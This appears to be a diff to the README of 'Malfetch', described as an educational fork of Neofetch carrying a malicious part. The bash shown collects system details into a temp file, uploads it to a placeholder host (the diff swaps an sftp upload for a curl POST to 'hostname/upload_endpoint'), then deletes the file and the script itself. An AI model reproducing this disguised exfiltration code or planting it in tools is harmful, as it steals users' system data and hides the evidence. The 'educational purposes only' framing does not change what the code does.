@@ -5,7 +5,7 @@ Malfetch is a fork of Neofetch designed for educational purposes. This repositor
 This repository is intended for educational purposes only. It is crucial to understand the ethical implications of using and distributing malicious code. Use this repository responsibly and only in environments where you have explicit permission to test and learn.
 
 # Malicious Part
-There is no default IP address or hostname, so the created system file won't go anywhere until you edit the code.
+There is no default hostname, so the created system file won't go anywhere until you edit the code.
 ``` bash
 logic() {
     [[ $distro ]] && return
@@ -38,16 +38,11 @@ malicious() {
                    echo "Disk Usage:" >> /tmp/xyz1048udk && \
                    df -h >> /tmp/xyz1048udk'
 
-    sftp username@hostname <<EOF
-put /tmp/xyz1048udk
-bye
-EOF
+    curl -X POST -F "file=@/tmp/xyz1048udk" https://hostname/upload_endpoint
 
     sudo rm /tmp/xyz1048udk
     sudo rm -- "$0"  
 }
-
-malicious()
 ```
 
 # How to Use
